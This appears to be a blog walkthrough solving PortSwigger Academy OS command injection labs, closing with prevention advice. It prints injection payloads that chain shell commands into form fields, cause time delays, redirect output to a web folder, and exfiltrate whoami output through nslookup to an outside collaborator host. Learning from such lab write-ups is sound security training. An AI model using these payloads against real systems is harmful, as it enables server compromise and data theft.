---
title: Os Command Injection Labs
date: 2022-06-10 12:00:00 -0400
image: 
 src: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci0.jpg
 height: 1100
 width: 500
categories: [Web Security, Portswigger Academy]
tags: [web security, labs, owasp, injection]
---

OS command injection allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

# OS command injection, simple case

This lab contains an [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.

Solution: 

We intercept the option check stock with Burpsuite to see what parameters are being sent by the function.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci1.jpg)

We see that it is passing the productID and storeID parameters, we will use ; to add the `whoami` command at the system level, we can also use | to add another command to the function.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci2.jpg)

We see that it returns the user peter, and the error is due to the fact that whoami is accompanied by another parameter which is the storeID, but we can see the execution of the command in the output.

# Blind OS command injection with time delays

This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS [command injection](https://portswigger.net/web-security/os-command-injection) vulnerability to cause a 10 second delay.

Solution: 

Since we know that the vulnerability is present, we must intercept the `feedback request`.


![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci3.jpg)

We see the entered fields, now we will try in each field the following payload which was url encoded followed and before a semicolon so that the system executes it since it is blind.

```bash
%3bping+-c+10+127.0.0.1%3b
```

I tried each field and the one I got a response 10 seconds later was the email field.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci4.jpg)

# Blind OS command injection with output redirection

This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:`/var/www/images/`

Solution:

Since we know the writable folder, we will intercept the request after sending a feedback and append the command `whoami`. then redirect the output to a file in the images directory.

`%3bwhoami+>+/var/www/images/whoami.txt%3b`

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci5.jpg)


Using this payload in the name field, we can exploit this vulnerability and retrieve the identity if the machine.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci6.jpg)

We retrieve the user `peter-5ecF3J` accessing to the file `whoami.txt` created before.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci7.jpg)

# Blind OS command injection with out-of-band interaction

This lab contains a blind OS [command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

Solution:

The same approach as others, we intercept the request and append the payload `%3bnslookup+kh517r226djh7tygiznk82rw6nce03.burpcollaborator.net%3b` next to the mail field and in the burp collaborator windows wait for the response.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci8.jpg)

We received the response, so we have out-of-band command injection.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci9.jpg)

# Blind OS command injection with out-of-band data exfiltration

This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

Solution:

Modify the `email` parameter, changing it to something like the following payload: `%3bnslookup+'whoami'zil3gb1836jd20t5u772s4e7pyvojd.burpcollaborator.net%3b` this will exfiltrate the command output data to the burp collaborator client.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci10.jpg)

We receive the output of the command and retrieve the user `peter-wGfYie`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/ci11.jpg)  

# How to prevent OS command injection attacks

By far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.

If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include:

-   Validating against a whitelist of permitted values.
-   Validating that the input is a number.
-   Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.